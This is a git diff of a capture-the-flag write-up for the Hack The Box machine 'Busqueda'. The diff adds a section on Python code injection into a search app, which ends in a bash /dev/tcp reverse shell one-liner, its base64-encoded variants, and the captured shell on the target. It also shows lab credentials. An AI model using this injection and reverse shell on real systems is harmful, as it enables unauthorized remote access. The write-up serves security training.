@@ -2,7 +2,7 @@
 title: HTB - Busqueda
 date: 2024-01-29
 categories: [CTF, Fullpwn]
-tags: [htb, hackthebox, busqueda, nmap, apache, python, searchor, suid, burp, ffuf, hydra, brute-force, dictionary-attack, mysql]
+tags: [htb, hackthebox, busqueda, nmap, apache, python, searchor, suid, burp, ffuf, hydra, brute-force, dictionary-attack, mysql, command-injection, revshellgen]
 img_path: /assets/htb/fullpwn/busqueda
 published: true
 image:
@@ -264,23 +264,7 @@ svc@busqueda:/var/www/app$ find / -perm -u=s 2>/dev/null
 /usr/bin/sudo
 /usr/bin/passwd
 /usr/bin/umount
-/usr/bin/fusermount3
-/usr/bin/gpasswd
-/usr/bin/chfn
-/usr/bin/su
-/usr/bin/chsh
-/snap/core20/1822/usr/bin/chfn
-/snap/core20/1822/usr/bin/chsh
-/snap/core20/1822/usr/bin/gpasswd
-/snap/core20/1822/usr/bin/mount
-/snap/core20/1822/usr/bin/newgrp
-/snap/core20/1822/usr/bin/passwd
-/snap/core20/1822/usr/bin/su
-/snap/core20/1822/usr/bin/sudo
-/snap/core20/1822/usr/bin/umount
-/snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/1822/usr/lib/openssh/ssh-keysign
-/snap/snapd/18357/usr/lib/snapd/snap-confine
+<SNIP>
 ```
 
 Check kernel and OS version:
@@ -331,7 +315,7 @@ svc@busqueda:/var/www/app/.git$ cat .git/config
         merge = refs/heads/main
 ```
 
-We already know that there is a user `cody`, and the above file looks like it contains `cody`'s credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can try using the password to gain SSH access for both users, i.e., `cody` or `svc`, since the latter is a service account and it is highly susceptible to password reuse:
+We already know that there is a user `cody`, and the above file looks like it contains `cody`'s credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can also try using the password to gain SSH access for both users, i.e., `cody` or `svc`, since the latter is a service account and it is highly susceptible to password reuse:
 
 ![](gitea_cody.png)
 
@@ -574,3 +558,105 @@ $ ffuf -request searchRequest -request-proto http -w /usr/share/seclists/Fuzzing
 
 ![](burp_contentLength.png)
 
+We can now try perform a kind of SQLi, but using Python syntax. We know that:
+- The quote symbol (`'`) is used to enclose strings.
+- The parameters in Python functions are enclosed in parentheses (`()`).
+- The hash symbol (`#`) is used to write comments in Python.
+
+Thus, we can start playing around with that until we get a response back:
+
+![](burp_pythonInjection.png)
+
+We can now test if we can achieve string concatenation:
+
+![](python_concat.png)
+
+Next, we can try achieving command execution:
+
+![](print.png)
+
+![](system_id.png)
+
+Finally, we can pass a reverse shell payload. We can crate our payload using [revshellgen.py](https://github.com/t0thkr1s/revshellgen):
+
+```bash
+---------- [ SELECT IP ] ----------
+
+[   ] 172.31.150.94 on eth0
+[   ] 172.17.0.1 on docker0
+[ x ] 10.10.14.12 on tun0
+[   ] Specify manually
+
+---------- [ SPECIFY PORT ] ----------
+
+[ # ] Enter port number : 9999
+
+---------- [ SELECT COMMAND ] ----------
+
+[ x ] unix_bash
+[   ] unix_java
+[   ] unix_nc_mkfifo
+[   ] unix_nc_plain
+[   ] unix_perl
+[   ] unix_php
+[   ] unix_python
+[   ] unix_ruby
+[   ] unix_telnet
+[   ] windows_powershell
+
+---------- [ SELECT ENCODE TYPE ] ----------
+
+[ x ] NONE
+[   ] URL ENCODE
+[   ] BASE64 ENCODE
+
+---------- [ FINISHED COMMAND ] ----------
+
+bash -i >& /dev/tcp/10.10.14.12/9999 0>&1
+
+[ ! ] Reverse shell command copied to clipboard!
+[ + ] In case you want to upgrade your shell, you can use this:
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+---------- [ SETUP LISTENER ] ----------
+
+[ x ] yes
+[   ] no
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:9999
+Ncat: Listening on 0.0.0.0:9999
+```
+
+Before passing our payload to Burp, we first need to clean any special characters arising after encoding it:
+
+```bash
+$ echo "bash -i >& /dev/tcp/10.10.14.12/9999 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi85OTk5IDA+JjEK
+
+$ echo "bash -i  >& /dev/tcp/10.10.14.12/9999  0>&1" | base64
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvOTk5OSAgMD4mMQo=
+
+$ echo "bash -i  >& /dev/tcp/10.10.14.12/9999  0>&1 " | base64
+YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvOTk5OSAgMD4mMSAK
+```
+
+Now that we have a clean string, we are ready to pass it to Burp:
+
+![](python_rce.png)
+
+And catch our reverse shell:
+
+```bash
+---------- [ SETUP LISTENER ] ----------
+
+[ x ] yes
+[   ] no
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:9999
+Ncat: Listening on 0.0.0.0:9999
+Ncat: Connection from 10.10.11.208:47376.
+bash: cannot set terminal process group (1645): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@busqueda:/var/www/app$
+```
